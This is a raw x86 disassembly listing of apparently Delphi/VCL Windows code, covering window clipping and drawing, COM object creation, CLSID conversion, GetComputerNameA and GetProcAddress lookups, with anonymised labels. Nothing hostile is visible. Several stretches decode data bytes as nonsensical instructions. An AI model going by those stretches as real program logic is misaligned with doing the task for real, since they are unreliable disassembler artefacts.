mov eax [ eax + 0xc ]
call sub_422f54
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x298 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x228 ]
mov eax [ eax + 0x14 ]
call sub_423720
mov eax [ ebp - 0x4 ]
mov si 0xffc8
call sub_403448
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x228 ]
mov eax [ eax + 0xc ]
mov edx 0xff000011
call sub_422f54
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x34 ] eax
add eax [ ebp - 0x14 ]
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x2c ] eax
sub eax [ ebp - 0x14 ]
mov [ ebp - 0x34 ] eax
jmp r-xdata
test bl bl
jne r-xdata
push ebx
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_462794
mov ecx eax
lea edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
call sub_462458
jmp r-xdata
sub_4623fc
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
mov eax [ ebx + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ ebp + 0x8 ]
mov edx [ edi + 0x8 ]
mov eax ebx
call sub_462b3c
test al al
jne r-xdata
mov edx ebp
mov eax ebx
call sub_439554
mov eax ebx
mov si 0xffc8
call sub_403448
test al al
jne r-xdata
mov eax ebx
call sub_4621d8
sub [ edi + 0x24 ] eax
mov eax ebx
call sub_4621d8
add [ edi + 0x1c ] eax
jmp r-xdata
sub_462458
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x1 ] cl
mov esi eax
xor edi edi
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x20 ]
sub edx eax
sub edx [ rw-data ]
sar edx 0x1
jns r-xdata
add edx eax
mov [ ebp - 0x30 ] edx
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x1c ]
sub edx eax
sub edx [ rw-data ]
sar edx 0x1
jns r-xdata
adc edx 0x0
add edx eax
mov [ ebp - 0x2c ] edx
mov eax [ ebp - 0x30 ]
add eax [ rw-data ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x2c ]
add eax [ rw-data ]
mov [ ebp - 0x24 ] eax
mov ebx [ esi + 0x228 ]
cmp [ esi + 0x281 ] 0x0
je r-xdata
adc edx 0x0
call sub_430fe0
call sub_4310c0
test al al
je r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
call CreateRectRgn
mov edi eax
push edi
mov eax ebx
call sub_423e68
push eax
call GetClipRgn
mov eax [ ebp - 0x24 ]
sub eax 0x2
push eax
mov eax [ ebp - 0x28 ]
sub eax 0x2
push eax
mov eax [ ebp - 0x2c ]
add eax 0x2
push eax
mov eax [ ebp - 0x30 ]
add eax 0x2
push eax
call CreateRectRgn
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
push eax
mov eax ebx
call sub_423e68
push eax
call SelectClipRgn
mov eax [ ebp - 0x10 ]
push eax
call DeleteObject
mov al [ ebp - 0x1 ]
sub al 0x1
jb r-xdata
mov al [ ebp - 0x1 ]
sub al 0x1
jb r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov [ ebp - 0x8 ] 0x408
mov [ ebp - 0x8 ] 0x400
jmp r-xdata
call sub_430fe0
lea ecx [ ebp - 0x3c ]
mov dl 0x12
call sub_43128c
jmp r-xdata
call sub_430fe0
lea ecx [ ebp - 0x3c ]
mov dl 0xf
call sub_43128c
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
push 0x4
lea eax [ ebp - 0x30 ]
push eax
mov eax ebx
call sub_423e68
push eax
call DrawFrameControl
or [ ebp - 0x8 ] 0x100
lea eax [ ebp - 0x20 ]
push eax
push 0x0
mov eax ebx
call sub_423e68
push eax
call sub_430fe0
lea ecx [ ebp - 0x3c ]
pop edx
call sub_43117c
jmp r-xdata
call sub_430fe0
lea ecx [ ebp - 0x3c ]
mov dl 0x1a
call sub_43128c
call sub_430fe0
lea ecx [ ebp - 0x3c ]
mov dl 0x17
call sub_43128c
jmp r-xdata
call sub_430fe0
lea ecx [ ebp - 0x3c ]
mov dl 0x16
call sub_43128c
jmp r-xdata
call sub_430fe0
lea ecx [ ebp - 0x3c ]
mov dl 0x13
call sub_43128c
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
push edi
mov eax ebx
call sub_423e68
push eax
call SelectClipRgn
push edi
call DeleteObject
mov eax [ ebx + 0x14 ]
call sub_423834
mov [ ebp - 0x9 ] al
mov eax [ ebx + 0x14 ]
call sub_423718
mov esi eax
mov eax [ ebx + 0x10 ]
call sub_423438
mov edi eax
mov dl 0x1
mov eax [ ebx + 0x14 ]
call sub_42383c
mov edx 0xff000010
mov eax [ ebx + 0x10 ]
call sub_423440
mov eax [ ebp - 0x28 ]
dec eax
push eax
mov eax [ ebp - 0x24 ]
dec eax
push eax
mov ecx [ ebp - 0x2c ]
inc ecx
mov edx [ ebp - 0x30 ]
inc edx
mov eax ebx
call sub_423c00
mov dl [ ebp - 0x9 ]
mov eax [ ebx + 0x14 ]
call sub_42383c
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_423720
mov edx edi
mov eax [ ebx + 0x10 ]
call sub_423440
cmp [ esi + 0x281 ] 0x0
je r-xdata
sub_4626b4
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov edx esi
mov eax edi
call sub_462794
cmp bl al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax edi
call sub_46297c
mov [ eax + 0x8 ] bl
mov edx esi
mov eax edi
call sub_4626e4
sub_4626e4
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_462b3c
test al al
jne r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov ecx esp
mov edx esi
mov eax ebx
call sub_438e14
mov eax ebx
mov si 0xffc8
call sub_403448
test al al
jne r-xdata
mov eax ebx
call sub_4621d8
mov edx [ esp + 0x8 ]
sub edx eax
mov [ esp ] edx
mov eax ebx
call sub_4621d8
add eax [ esp ]
mov [ esp + 0x8 ] eax
jmp r-xdata
test [ ebx + 0x50 ] 0x40
setne al
xor al 0x1
neg al
sbb eax eax
push eax
lea eax [ esp + 0x4 ]
push eax
mov eax ebx
call sub_446be4
push eax
call InvalidateRect
mov eax ebx
call sub_446be4
push eax
call UpdateWindow
sub_462768
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_462a30
test al al
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_46297c
mov al [ eax + 0x9 ]
xor al 0x1
pop esi
pop ebx
retn
sub_462794
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_462a30
test al al
je r-xdata
mov eax [ r-xdata ]
call sub_462054
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_46297c
mov al [ eax + 0x8 ]
pop esi
pop ebx
retn
sub_4627c4
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi ] 0x20
jne r-xdata
mov edx esi
mov eax ebx
call sub_439788
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
mov eax ebx
call sub_4628c4
sub_4627ee
mov eax eax
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x2 ] cl
mov [ ebp - 0x1 ] dl
mov ebx eax
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
push edi
push esi
mov cl [ ebp - 0x2 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
call sub_44198c
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
lea ecx [ ebp - 0x10 ]
mov edx esi
mov eax edi
call sub_418ddc
lea edx [ ebp - 0x10 ]
mov cl 0x1
mov eax ebx
call sub_438d88
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0xffffffff
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_462768
test al al
je r-xdata
mov eax ebx
mov si 0xffc8
call sub_403448
test al al
jne r-xdata
lea ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_438e14
mov esi [ ebp - 0x18 ]
mov eax ebx
call sub_4621d8
sub esi eax
sub edi esi
test edi edi
jle r-xdata
lea ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_438e14
sub edi [ ebp - 0x20 ]
mov eax ebx
call sub_4621d8
cmp edi eax
jge r-xdata
mov eax ebx
call sub_4621d8
cmp edi eax
jge r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_4628c4
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_4628c4
sub_4628c4
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp esi eax
jge r-xdata
mov edx esi
mov eax ebx
call sub_462768
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_462794
mov edx eax
sub dl 0x1
jb r-xdata
cmp [ ebx + 0x280 ] 0x0
je r-xdata
je r-xdata
mov al 0x1
jmp r-xdata
mov al 0x2
jmp r-xdata
xor eax eax
jmp r-xdata
dec dl
je r-xdata
mov ecx eax
mov edx esi
mov eax ebx
call sub_4626b4
mov eax ebx
mov si 0xffad
call sub_403448
mov al 0x1
jmp r-xdata
sub_462954
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor edi edi
mov edx esi
mov eax ebx
call sub_462a30
test al al
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_46297c
mov edi [ eax + 0x4 ]
sub_46297c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_46299c
test eax eax
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_462a08
sub_46299c
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_438590
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
test ebx ebx
je r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0x0
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba30
call sub_4039d8
mov eax ebx
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4033d8
test al al
jne r-xdata
xor ebx ebx
sub_462a08
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_40321c
mov esi eax
mov ecx esi
mov edx edi
mov eax ebx
call sub_4385b0
mov eax esi
pop edi
pop esi
pop ebx
retn
sub_462a48
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_462a30
test al al
jne r-xdata
mov edx esi
mov eax ebx
call sub_46297c
mov [ eax + 0x4 ] edi
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_462a74
push ebx
push esi
push edi
mov edi eax
mov eax [ edi + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax edi
call sub_43860c
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov edx ebx
mov eax edi
call sub_46297c
call sub_40324c
mov edx ebx
mov eax edi
call sub_462a30
test al al
je r-xdata
sub_462ab8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_462a30
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_4385ec
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_46297c
call sub_40324c
sub_462afc
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov edx ebp
mov eax edi
call sub_445e00
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_46299c
call sub_40324c
inc esi
dec ebx
jne r-xdata
sub_462b3c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_462a30
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_46297c
mov al [ eax + 0xa ]
pop esi
pop ebx
retn
sub_462b8c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_462bb1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462bb8
retn
sub_462bcc
push 0xf90047a6
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add dl bh
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add bl bh
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add ah bh
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add ch bh
inc [ eax ]
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_462c19
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462c20
retn
sub_462c30
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
js r-xdata
dec edi
insb
inc ebp
jb r-xdata
inc esi
add [ eax + eax ] cl
add [ eax ] al
in al dx
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
sub eax 0x180046
add [ eax ] al
test [ esi + eax * 2 ] ch
add [ esp + esi + 0x34a00040 ] dl
inc eax
add [ esp + esi + 0x34a80040 ] ah
inc eax
add [ esp + esi + 0x31e40040 ] bl
inc eax
add [ eax ] al
xor al [ eax ]
cmp al 0x32
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
sub al 0x46
add [ eax ] dl
add [ eax ] al
add [ esp + ebp ] ch
inc esi
add [ esp + esi + 0x34a00040 ] dl
inc eax
add [ esp + esi + 0x34a80040 ] ah
inc eax
add [ esp + esi + 0x31e40040 ] bl
inc eax
add [ eax ] al
xor al [ eax ]
cmp al 0x32
inc eax
add [ eax * 2 + 0x53656c4f ] cl
jns r-xdata
add [ esp + esi + 0x34a00040 ] dl
inc eax
add [ esp + esi + 0x34a80040 ] ah
inc eax
add [ esp + esi + 0x31e40040 ] bl
inc eax
add [ eax ] al
xor al [ eax ]
cmp al 0x32
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462c20
retn
rcl al 0x2c
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebp
js r-xdata
inc ebp
jb r-xdata
sbb ecx [ ebx + 0x16a3e803 ]
cli
dec [ ebx - 0x742fd42a ]
retn
jo r-xdata
arpl [ ebp + 0x70 ] sp
je r-xdata
outsd
jb r-xdata
add ebp eax
mov [ ecx - 0x6 ] ebx
imul ebp [ edi + 0x6e ] 0xffffffff
or [ eax ] eax
add [ eax ] al
inc ecx
jo r-xdata
sub edx eax
mov eax ebx
call sub_4045e8
mov eax [ ebx ]
call sub_408754
mov esi eax
mov eax [ ebx ]
call sub_40425c
test eax eax
jle r-xdata
outsd
outsb
inc eax
add [ ecx ] cl
inc ebp
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add [ edx + esi ] bh
inc eax
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add ah dh
adc [ eax ] al
adc [ eax ] al
add [ eax ] al
hlt
inc eax
add [ ebp + 0x46 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub al 0x2d
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x2d ] al
inc esi
add [ eax ] bl
add [ eax ] al
add [ esp + ebp + 0x34940046 ] al
inc eax
add [ eax - 0x5bffbfcc ] ah
xor al 0x40
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add [ edx + esi ] bh
mov eax [ ebx ]
call sub_40445c
mov edx esi
sub al 0xd
je r-xdata
dec [ ebx - 0x17fc7410 ]
mov [ edx + edi * 8 ] dl
inc [ ebp - 0x75f58140 ]
and al 0x18
cli
dec [ ebx + 0x5989e803 ]
cli
jb r-xdata
pop esi
pop ebx
retn
sub al 0x21
jb r-xdata
mov al [ esi ]
push es
sar [ esi + 0xa ] 0x8a
insd
outsb
je r-xdata
add [ eax ] al
sub_462d98
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx esi
call sub_403ff0
mov eax [ ebx ]
call sub_408754
mov esi eax
jmp r-xdata
mov eax [ ebx ]
call sub_40425c
test eax eax
jle r-xdata
pop esi
pop ebx
retn
mov al [ esi ]
sub al 0x21
jb r-xdata
mov eax [ ebx ]
call sub_40445c
mov edx esi
sub edx eax
mov eax ebx
call sub_4045e8
mov eax [ ebx ]
call sub_408754
mov esi eax
sub al 0xd
je r-xdata
sub_462de8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ebx
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov esi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_462e8f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
mov edx edi
call sub_404034
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_403570
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
xor edx edx
mov eax ebx
call sub_40bac4
mov [ ebx + 0xc ] esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462e96
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_403fc0
retn
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_40b124
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405eac
mov edx [ ebp - 0xc ]
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0x0
lea ecx [ ebp - 0x14 ]
lea eax [ ebp - 0x8 ]
call sub_408fe0
sub_462e96
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_462eb8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_462f2a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_462d98
mov ecx [ ebp - 0x4 ]
xor edx edx
mov eax edi
call sub_462de8
lea eax [ edi + 0x10 ]
mov edx [ ebp + 0x10 ]
call sub_403ff0
lea eax [ edi + 0x14 ]
mov edx [ ebp + 0xc ]
call sub_403ff0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462f31
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
add esp 0xfffffff0
call sub_403570
sub_462f31
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x10
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_462f84
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
push esp
push ebx
call StringFromCLSID
call sub_462f6c
mov eax esi
mov edx [ esp ]
call sub_4041c4
mov eax [ esp ]
push eax
call CoTaskMemFree
pop edx
pop esi
pop ebx
retn
sub_462fb0
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
push esp
push ebx
call ProgIDFromCLSID
call sub_462f6c
mov eax esi
mov edx [ esp ]
call sub_4041c4
mov eax [ esp ]
push eax
call CoTaskMemFree
pop edx
pop esi
pop ebx
retn
sub_462fdc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_4059cc
push eax
push r-xdata
push 0x5
push 0x0
push ebx
call CoCreateInstance
call sub_462f6c
pop esi
pop ebx
retn
sub_463014
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x44 ] ebx
mov [ ebp - 0x48 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
call sub_404934
xor eax eax
push ebp
push sub_463158
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
lea eax [ ebp - 0x20 ]
xor ecx ecx
mov edx 0x10
call sub_402c58
mov eax ebx
call sub_404804
mov [ ebp - 0x1c ] eax
push esi
push edi
mov esi r-xdata
lea edi [ ebp - 0x30 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
lea eax [ ebp - 0x30 ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0xc ]
call sub_4059cc
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax ebx
call sub_404814
test eax eax
jle r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9f4
call sub_4039d8
mov ebx 0x15
mov [ ebp - 0x4 ] 0x10
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call GetComputerNameA
test eax eax
je r-xdata
mov ebx 0x10
jmp r-xdata
lea eax [ ebp - 0x44 ]
mov edx ebx
call sub_404224
mov eax [ ebp - 0x44 ]
push eax
lea eax [ ebp - 0x48 ]
lea edx [ ebp - 0x40 ]
mov ecx 0x10
call sub_40420c
mov eax [ ebp - 0x48 ]
pop edx
call sub_408144
test eax eax
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea eax [ ebp - 0x20 ]
push eax
push ebx
push 0x0
push esi
call [ rw-data ]
call sub_462f6c
mov eax [ ebp - 0x8 ]
call sub_462f6c
mov eax edi
mov edx [ ebp - 0xc ]
call sub_4059e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46315f
lea eax [ ebp - 0x48 ]
mov edx 0x2
call sub_403fc0
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
call sub_404a04
retn
mov ebx 0x15
jmp r-xdata
sub_463178
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_463204
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebx ] eax
lea eax [ ebp - 0x8 ]
call sub_4059cc
push eax
push r-xdata
push esi
mov eax [ esi ]
call [ eax ]
call sub_41774c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46320b
lea eax [ ebp - 0xc ]
call sub_4059cc
lea eax [ ebp - 0x8 ]
call sub_4059cc
retn
lea eax [ ebp - 0xc ]
call sub_4059cc
push eax
push edi
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
call sub_41774c
test al al
je r-xdata
push ebx
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
sub_463224
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_4632b6
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4632bd
lea eax [ ebp - 0x8 ]
call sub_4059cc
lea eax [ ebp - 0x4 ]
call sub_4059cc
retn
lea eax [ ebp - 0x4 ]
call sub_4059cc
push eax
push r-xdata
push esi
mov eax [ esi ]
call [ eax ]
call sub_41774c
test al al
je r-xdata
lea eax [ ebp - 0x8 ]
call sub_4059cc
push eax
push edi
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
call sub_41774c
test al al
je r-xdata
mov eax [ ebx ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
call sub_41774c
test al al
je r-xdata
xor eax eax
mov [ ebx ] eax
sub_4632d4
push ebx
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
sub_4633d6
add [ eax ] al
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4634c8
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x4 ]
call sub_4059cc
push eax
push 0x0
call GetErrorInfo
test eax eax
jne r-xdata
push esi
push ebx
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
call sub_404224
mov eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x1c ]
mov edx [ ebp - 0x10 ]
call sub_404224
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
call sub_404224
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_462eb8
jmp sub_4039d8
lea eax [ ebp - 0x8 ]
call sub_4046a8
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
lea eax [ ebp - 0xc ]
call sub_4046a8
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
lea eax [ ebp - 0x10 ]
call sub_4046a8
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x1c ]
sub_463498
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4634cf
lea eax [ ebp - 0x20 ]
mov edx 0x3
call sub_403fc0
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_4046c0
lea eax [ ebp - 0x4 ]
call sub_4059cc
retn
sub_4634d8
push ebp
mov ebp esp
add esp 0xfffff9b0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x50 ]
mov edx [ r-xdata ]
call sub_404934
xor eax eax
push ebp
push sub_46380b
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x10 ] eax
xor ecx ecx
push ebp
push sub_4637e8
push [ fs : ecx ]
mov [ fs : ecx ] esp
movzx edi [ esi + 0x1 ]
cmp edi 0x40
jle r-xdata
test edi edi
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9f4
call sub_4039d8
lea eax [ ebp - 0x650 ]
mov [ ebp - 0x30 ] eax
mov eax [ ebp - 0x8 ]
add eax 0x4
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] edi
xor eax eax
mov al [ esi + 0x2 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
xor eax eax
mov al [ esi ]
cmp eax 0x4
jne r-xdata
mov eax [ ebp + 0xc ]
mov [ ebp - 0x14 ] eax
mov eax edi
add eax eax
lea eax [ ebp + eax * 8 - 0x650 ]
